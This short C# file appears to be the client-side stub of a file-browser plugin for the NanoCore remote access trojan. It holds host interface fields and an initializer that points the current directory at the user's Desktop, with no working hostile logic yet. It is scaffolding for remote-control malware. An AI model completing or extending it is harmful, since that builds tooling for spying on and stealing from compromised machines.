using System;
using NanoCore.ClientPluginHost;

namespace FileBrowserClient
{
	public sealed class ClientMain
	{
		public static IClientLoggingHost LoggingHost;
		public static IClientNetworkHost NetworkHost;
		public static string CurrentDirectory;

		public static void InitializePlugin()
		{
			CurrentDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		}
	}
}